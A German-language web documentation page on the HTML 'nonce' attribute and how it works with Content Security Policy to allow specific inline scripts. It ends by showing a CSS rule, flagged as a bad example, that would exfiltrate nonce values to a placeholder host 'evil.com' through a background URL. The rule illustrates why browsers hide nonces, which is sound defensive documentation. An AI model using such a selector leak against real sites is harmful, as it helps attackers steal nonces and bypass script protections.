---
title: nonce
slug: Web/HTML/Global_attributes/nonce
l10n:
  sourceCommit: 926f83641b980fcda58914649748b0368eeca1cd
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Global_attributes)
ist ein Inhaltsattribut, das eine kryptografische Nonce ("Nummer, die einmal verwendet wird") definiert und von der [Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet werden kann, um zu bestimmen, ob ein bestimmter Abruf für ein gegebenes Element zugelassen wird oder nicht.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente wie ein bestimmtes Inline-Skript oder Style-Elemente auf die Allowlist zu setzen.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/CSP) `unsafe-inline`-Direktive zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf die Allowlist setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine Möglichkeit haben, unsichere Inline-Skript- oder Style-Inhalte zu vermeiden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, können Sie stattdessen auch einen CSP-Hash verwenden.
> (Siehe Nutzungshinweise zu [unsafe inline script](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/CSP)-Schutzmaßnahmen zu nutzen und Nonces oder unsichere Inline-Skripte wann immer möglich zu vermeiden.

### Verwendung von nonce, um ein \<script>-Element auf die Allowlist zu setzen

Es sind einige Schritte erforderlich, um ein Inline-Skript mithilfe des Nonce-Mechanismus auf die Allowlist zu setzen:

#### Generierung von Werten

Erzeugen Sie von Ihrem Webserver aus eine zufällige, base64-kodierte Zeichenkette mit mindestens 128 Bit Daten aus einem kryptografisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal unterschiedlich generiert werden, wenn die Seite geladen wird (Nonce nur einmal!). Zum Beispiel in Node.js:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Auf die Allowlist setzen von Inline-Skript

Die in Ihrem Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Allowlist setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Headers/Content-Security-Policy)-Header senden
(`nonce-` voranstellen):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Nonce-Verbergung

Aus Sicherheitsgründen wird das `nonce`-Inhaltsattribut verborgen (eine leere Zeichenkette wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // gibt leere Zeichenkette zurück
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // gibt Nonce-Wert zurück
```

Nonce-Verbergung hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen, die Daten aus Inhaltsattributen wie diesem extrahieren können, zu exfiltrieren:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
